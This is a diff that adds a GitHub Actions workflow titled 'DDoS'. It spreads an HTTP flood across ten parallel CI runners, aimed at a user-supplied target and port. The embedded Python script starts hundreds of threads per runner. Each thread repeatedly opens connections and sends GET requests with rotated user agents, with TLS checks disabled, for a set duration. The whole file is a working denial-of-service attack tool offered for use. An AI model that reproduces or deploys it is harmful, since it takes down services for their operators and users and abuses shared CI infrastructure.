@@ -1,0 +1,79 @@
+name: DDoS
+
+on:
+  workflow_dispatch:
+    inputs:
+      target:
+        description: 'Target'
+        required: true
+      port:
+        description: 'Port'
+        required: true
+        default: '80'
+      threads:
+        description: 'Threads'
+        required: true
+        default: '500'
+      duration:
+        description: 'Duration'
+        required: true
+        default: '300'
+
+jobs:
+  attack:
+    runs-on: ubuntu-latest
+    strategy:
+      matrix:
+        node: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10]
+    
+    steps:
+      - uses: actions/setup-python@v5
+        with:
+          python-version: '3.11'
+      
+      - name: Run
+        env:
+          TARGET: ${{ github.event.inputs.target }}
+          PORT: ${{ github.event.inputs.port }}
+          THREADS: ${{ github.event.inputs.threads }}
+          DURATION: ${{ github.event.inputs.duration }}
+        run: |
+          python3 << 'EOF'
+          import socket, threading, random, time, ssl, os
+          
+          host = os.environ['TARGET']
+          port = int(os.environ['PORT'])
+          threads = int(os.environ['THREADS'])
+          duration = int(os.environ['DURATION'])
+          
+          UA = ["Mozilla/5.0 (Windows NT 10.0; Win64; x64)", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)"]
+          PATHS = ["/", "/index.html", "/robots.txt"]
+          sent = 0
+          lock = threading.Lock()
+          
+          def worker():
+              global sent
+              end = time.time() + duration
+              while time.time() < end:
+                  try:
+                      s = socket.socket()
+                      s.settimeout(3)
+                      s.connect((host, port))
+                      if port == 443:
+                          ctx = ssl.create_default_context()
+                          ctx.check_hostname = False
+                          ctx.verify_mode = ssl.CERT_NONE
+                          s = ctx.wrap_socket(s, server_hostname=host)
+                      req = f"GET {random.choice(PATHS)} HTTP/1.1\r\nHost: {host}\r\nUser-Agent: {random.choice(UA)}\r\nConnection: keep-alive\r\n\r\n"
+                      s.send(req.encode())
+                      s.close()
+                      with lock:
+                          sent += 1
+                  except:
+                      pass
+          
+          for _ in range(threads):
+              threading.Thread(target=worker, daemon=True).start()
+          time.sleep(duration + 5)
+          print(f"[DONE] {sent} requests")
+          EOF
